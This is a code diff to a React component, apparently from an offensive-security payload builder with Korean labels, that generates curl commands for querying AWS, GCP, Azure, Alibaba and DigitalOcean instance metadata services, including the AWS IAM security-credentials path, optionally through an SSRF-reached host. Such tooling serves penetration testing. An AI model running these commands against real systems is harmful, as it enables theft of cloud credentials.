@@ -2,11 +2,35 @@ import { useState } from 'react'
 import { DISCLAIMER, Note, Pick, TextInput, Readout } from './shared'
 import { TARGETS } from './ssrf'
 
+const CLOUD_TARGET_IDS = ['aws-imds', 'aws-imds-token', 'gcp', 'azure', 'alibaba', 'do']
+const CLOUD_TARGETS = TARGETS.filter(t => CLOUD_TARGET_IDS.includes(t.id))
+
 export function CloudMisconfigBuilder() {
   const [targetId, setTargetId] = useState('aws-imds')
   const [customHost, setCustomHost] = useState('')
   
-  const target = TARGETS.find(t => t.id === targetId)!
+  const target = CLOUD_TARGETS.find(t => t.id === targetId) || CLOUD_TARGETS[0]!
+
+  const getCloudCurlCommand = (target: typeof CLOUD_TARGETS[number], customHost: string) => {
+    const host = customHost || target.host
+    const url = customHost ? target.url.replace(target.host, customHost) : target.url
+
+    switch (target.id) {
+      case 'aws-imds':
+        return `curl -s http://${host}/latest/meta-data/iam/security-credentials/`
+      case 'aws-imds-token':
+        return `TOKEN=$(curl -s -X PUT "http://${host}/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\ncurl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://${host}/latest/meta-data/iam/security-credentials/`
+      case 'gcp':
+        return `curl -s -H "Metadata-Flavor: Google" ${url}`
+      case 'azure':
+        return `curl -s -H "Metadata: true" ${url}`
+      case 'alibaba':
+      case 'do':
+        return `curl -s ${url}`
+      default:
+        return url
+    }
+  }
 
   const ecsMetadata = [
     { label: 'ECS 컨테이너 메타데이터 (V4)', cmd: 'curl -s "$ECS_CONTAINER_METADATA_URI_V4" | jq .' },
@@ -24,8 +48,8 @@ export function CloudMisconfigBuilder() {
     <div className="payload-builder">
       <Note>{DISCLAIMER}</Note>
       
-      <Pick label="IMDS 타겟" value={targetId} onChange={setTargetId} options={TARGETS.map(t => ({ id: t.id, label: t.label }))}/>
-      <Readout title={target.label} value={customHost ? target.url.replace(target.host, customHost) : target.url} wrap="anywhere"/>
+      <Pick label="IMDS 타겟" value={targetId} onChange={setTargetId} options={CLOUD_TARGETS.map(t => ({ id: t.id, label: t.label }))}/>
+      <Readout title={target.label} value={getCloudCurlCommand(target, customHost)} wrap="anywhere"/>
       <TextInput label="커스텀 호스트 (선택, SSRF로 접근한 내부 IP 등)" value={customHost} onChange={setCustomHost} placeholder={target.host}/>
 
       <div className="payload-readout-group">
